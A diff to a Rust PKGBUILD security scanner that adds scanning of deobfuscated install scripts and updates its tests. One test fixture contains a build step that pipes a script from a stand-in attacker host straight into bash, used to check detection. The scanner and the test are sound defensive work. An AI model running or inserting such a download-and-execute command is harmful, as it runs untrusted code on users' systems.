@@ -25,9 +25,9 @@ impl SecurityAnalyzer for PatternAnalyzer {
         let mut findings = Vec::new();
 
         // Analyze PKGBUILD content
-        let pkgbuild_matches =
-            self.rule_engine
-                .match_content(&context.pkgbuild.raw_content, FileType::Pkgbuild);
+        let pkgbuild_matches = self
+            .rule_engine
+            .match_content(&context.pkgbuild.raw_content, FileType::Pkgbuild);
 
         for rule_match in pkgbuild_matches {
             if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
@@ -79,6 +79,49 @@ impl SecurityAnalyzer for PatternAnalyzer {
                             "in_install_script": true,
                         }),
                     });
+                }
+            }
+
+            // Also scan deobfuscated install content if present.
+            if let Some(ref deob) = context.deobfuscated_install_content {
+                // Only scan if the deobfuscated content differs from the original.
+                if *deob != install_script.content {
+                    let deob_matches = self
+                        .rule_engine
+                        .match_content(deob, FileType::InstallScript);
+
+                    for rule_match in deob_matches {
+                        if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
+                            // Skip if this rule already fired on the original content
+                            // (same rule ID on same line is a duplicate).
+                            let dup = findings.iter().any(|f| {
+                                f.id == rule.id && f.location.line == Some(rule_match.line)
+                            });
+                            if dup {
+                                continue;
+                            }
+                            findings.push(Finding {
+                                id: rule.id.clone(),
+                                severity: rule.severity,
+                                category: rule.category.clone(),
+                                title: format!("{} (install script, deobfuscated)", rule.name),
+                                description: rule.description.clone(),
+                                location: Location {
+                                    file: install_script.path.clone(),
+                                    line: Some(rule_match.line),
+                                    column: Some(rule_match.column),
+                                    snippet: Some(rule_match.context.clone()),
+                                },
+                                recommendation: rule.recommendation.clone(),
+                                cwe_id: rule.cwe_id.clone(),
+                                metadata: serde_json::json!({
+                                    "matched_text": rule_match.matched_text,
+                                    "in_install_script": true,
+                                    "deobfuscated": true,
+                                }),
+                            });
+                        }
+                    }
                 }
             }
         }
@@ -162,7 +205,7 @@ impl PatternAnalyzer {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::parser::{StaticParser, PkgbuildParser};
+    use crate::parser::{PkgbuildParser, StaticParser};
     use crate::types::ScanConfig;
     use std::path::PathBuf;
 
@@ -175,6 +218,10 @@ mod tests {
             install_script: None,
             config: ScanConfig::default(),
             file_path: PathBuf::from("PKGBUILD"),
+            deobfuscated_pkgbuild_content: None,
+            deobfuscated_install_content: None,
+            resolved_variables: std::collections::HashMap::new(),
+            maintainer_id: None,
         }
     }
 
@@ -183,14 +230,16 @@ mod tests {
         let rule_engine = Arc::new(RuleEngine::default());
         let analyzer = PatternAnalyzer::new(rule_engine);
 
-        let context = create_test_context(r#"
+        let context = create_test_context(
+            r#"
 pkgname=test
 pkgver=1.0
 pkgrel=1
 build() {
     curl https://evil.com/script.sh | bash
 }
-"#);
+"#,
+        );
 
         let findings = analyzer.analyze(&context).await.unwrap();
         assert!(!findings.is_empty());
@@ -202,7 +251,8 @@ build() {
         let rule_engine = Arc::new(RuleEngine::default());
         let analyzer = PatternAnalyzer::new(rule_engine);
 
-        let context = create_test_context(r#"
+        let context = create_test_context(
+            r#"
 pkgname=test
 pkgver=1.0
 pkgrel=1
@@ -214,7 +264,8 @@ build() {
 package() {
     make DESTDIR="$pkgdir" install
 }
-"#);
+"#,
+        );
 
         let findings = analyzer.analyze(&context).await.unwrap();
         // Should have no critical findings
